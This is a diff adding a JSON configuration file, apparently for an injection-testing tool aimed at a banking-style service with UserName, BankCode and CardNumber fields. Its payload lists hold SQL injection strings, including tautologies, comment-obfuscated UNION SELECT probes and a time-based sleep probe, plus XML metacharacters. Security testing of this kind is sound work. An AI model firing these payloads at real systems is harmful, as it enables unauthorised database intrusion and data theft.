@@ -1,0 +1,58 @@
+{
+  "output-language": "xml",
+
+  "target-entries": [
+    {
+      "value": "wgen0001",
+      "proxy-key": "UserName",
+      "html-target": "UserName"
+    },
+    {
+      "value": "0111",
+      "proxy-key": "BankCode",
+      "html-target": "BankCode"
+    },
+    {
+      "value": "0001User",
+      "proxy-key": "RequestId",
+      "html-target": "RequestId"
+    },
+    {
+      "value": "123456789123456",
+      "proxy-key": "CardNumber",
+      "html-target": "UserName"
+    }
+  ],
+  "injections": {
+    "close": [
+      "</test>"
+    ],
+    "meta": [
+      "<",
+      "'",
+      "\"",
+      ">"
+    ],
+    "insert": [
+      "0 or~/**/1",
+      "1 or/**/\"a\"=\"a\" or",
+      "')/**/or true#",
+      "0/**/||'a'='a'/**/",
+      "'/**/;select sleep(5)--",
+      "0 union/**/(select 0)#",
+      "')/**/union/**/(select 0)#"
+    ],
+    "replicate": [
+      "0 or~/**/1",
+      "1 or/**/\"a\"=\"a\" or",
+      "')/**/or true#",
+      "0/**/||'a'='a'/**/"
+    ],
+    "replace": [
+      "0 or~/**/1",
+      "1 or/**/\"a\"=\"a\" or",
+      "')/**/or true#",
+      "0/**/||'a'='a'/**/"
+    ]
+  }
+}
